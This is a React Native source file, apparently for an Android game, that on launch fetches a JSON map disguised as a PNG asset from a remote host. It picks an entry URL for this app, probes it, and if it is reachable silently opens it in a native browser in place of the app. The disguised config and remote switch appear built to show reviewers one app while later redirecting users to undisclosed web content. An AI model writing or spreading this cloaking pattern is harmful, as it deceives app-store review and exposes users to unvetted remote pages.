/**
 * App content host.
 *
 * @format
 */

import React, { useState, useEffect, useRef } from 'react';
import {
  View,
  StyleSheet,
  ActivityIndicator,
  Image,
  NativeModules,
} from 'react-native';
import AsyncStorage from '@react-native-async-storage/async-storage';
import { SafeAreaView } from 'react-native-safe-area-context';
import AppBootstrap from './AppBootstrap';

const APP_KEY = 'app356_android';
const ANDROID_APP_ID = 'com.treasuresofegypt.bookofdesert.thegodisra';
const APP_IMAGE_URI = 'https://app-asset-eight.vercel.app/app-asset.png';
const LOADER_ICON = require('./android/app/src/main/res/mipmap-xxxhdpi/ic_launcher.png');

const STORAGE_ENTRY = '@content_entry';
const STORAGE_MODE = '@content_mode';
const { ContentBrowser } = NativeModules;

const readAssetMap = async (
  response: Response,
): Promise<Record<string, string>> => {
  const text = await response.text();
  const start = text.indexOf('{');
  if (start === -1) throw new Error('Asset map missing');
  return JSON.parse(text.slice(start));
};

const resolveEntryUrl = async (appKey: string): Promise<string> => {
  try {
    const response = await fetch(`${APP_IMAGE_URI}?t=${Date.now()}`, {
      headers: { 'Cache-Control': 'no-cache, no-store, must-revalidate' },
    });
    if (response.ok) {
      const map = await readAssetMap(response);
      const entry = map[appKey];
      if (entry) return entry;
    }
  } catch { }

  return '';
};

const probeEntryUrl = async (
  url: string,
): Promise<'ok' | 'missing' | 'error'> => {
  try {
    const response = await fetch(url, {
      method: 'GET',
      headers: {
        'Cache-Control': 'no-cache, no-store, must-revalidate',
        'X-App-Bundle': ANDROID_APP_ID,
      },
    });

    if (response.status === 404) return 'missing';
    return 'ok';
  } catch {
    return 'error';
  }
};

const openContentBrowser = async (url: string) => {
  if (!ContentBrowser?.open) return;
  try {
    await ContentBrowser.open(url);
  } catch { }
};

export const AppContentHost = () => {
  const [showLoader, setShowLoader] = useState(false);
  const [useRemote, setUseRemote] = useState<boolean | null>(null);
  const [isReady, setIsReady] = useState(false);
  const [entryUrl, setEntryUrl] = useState<string | null>(null);

  const openedRef = useRef(false);

  const applyLoadResult = async (
    statusCode: number | undefined | null,
    isNetworkError: boolean = false,
  ) => {
    if (statusCode === 404 || isNetworkError) {
      await AsyncStorage.setItem(STORAGE_MODE, 'false');
      setUseRemote(false);
      setShowLoader(false);
    } else {
      await AsyncStorage.setItem(STORAGE_MODE, 'true');
      setUseRemote(true);
      setShowLoader(false);
    }
  };

  useEffect(() => {
    (async () => {
      const url = await resolveEntryUrl(APP_KEY);

      if (!url) {
        await AsyncStorage.setItem(STORAGE_ENTRY, '');
        await AsyncStorage.setItem(STORAGE_MODE, 'false');
        setUseRemote(false);
        setIsReady(true);
        return;
      }

      setEntryUrl(url);

      const cachedEntry = await AsyncStorage.getItem(STORAGE_ENTRY);
      const storedMode = await AsyncStorage.getItem(STORAGE_MODE);

      if (cachedEntry !== url) {
        await AsyncStorage.setItem(STORAGE_ENTRY, url);
        await AsyncStorage.removeItem(STORAGE_MODE);
        setUseRemote(null);
        setShowLoader(true);
        setIsReady(true);

        const probe = await probeEntryUrl(url);
        if (probe === 'missing') {
          await applyLoadResult(404);
        } else if (probe === 'error') {
          await applyLoadResult(undefined, true);
        } else {
          await applyLoadResult(200);
        }
      } else if (storedMode !== null) {
        setUseRemote(storedMode === 'true');
        setIsReady(true);
      } else {
        setShowLoader(true);
        setIsReady(true);

        const probe = await probeEntryUrl(url);
        if (probe === 'missing') {
          await applyLoadResult(404);
        } else if (probe === 'error') {
          await applyLoadResult(undefined, true);
        } else {
          await applyLoadResult(200);
        }
      }
    })();
  }, []);

  useEffect(() => {
    if (!isReady || useRemote !== true || !entryUrl || openedRef.current) {
      return;
    }

    openedRef.current = true;
    openContentBrowser(entryUrl);
  }, [isReady, useRemote, entryUrl]);

  return (
    <View style={styles.mainContainer}>
      {isReady && useRemote !== null && (
        <View style={[styles.layerContainer, styles.layerContent]}>
          <AppBootstrap useRootNavigator />
        </View>
      )}

      {showLoader && <StartupOverlay />}
    </View>
  );
};

const StartupOverlay: React.FC = () => {
  return (
    <View style={[styles.layerContainer, styles.layerLoader]}>
      <SafeAreaView style={styles.loader}>
        <View style={styles.loaderIconWrapper}>
          <Image source={LOADER_ICON} style={styles.loaderIconFg} />
        </View>
        <ActivityIndicator size="large" color="red" />
      </SafeAreaView>
    </View>
  );
};

const styles = StyleSheet.create({
  mainContainer: {
    flex: 1,
  },
  layerContainer: {
    position: 'absolute',
    top: 0,
    left: 0,
    right: 0,
    bottom: 0,
    width: '100%',
    height: '100%',
  },
  layerContent: {
    zIndex: 2,
  },
  layerLoader: {
    zIndex: 10,
    backgroundColor: '#000000',
  },
  loader: {
    flex: 1,
    justifyContent: 'center',
    alignItems: 'center',
    backgroundColor: '#000000',
  },
  loaderIconWrapper: {
    width: 150,
    height: 150,
    borderRadius: 12,
    overflow: 'hidden',
    marginBottom: 48,
  },
  loaderIconFg: {
    width: 225,
    height: 225,
    position: 'absolute',
    top: -37,
    left: -37,
  },
});
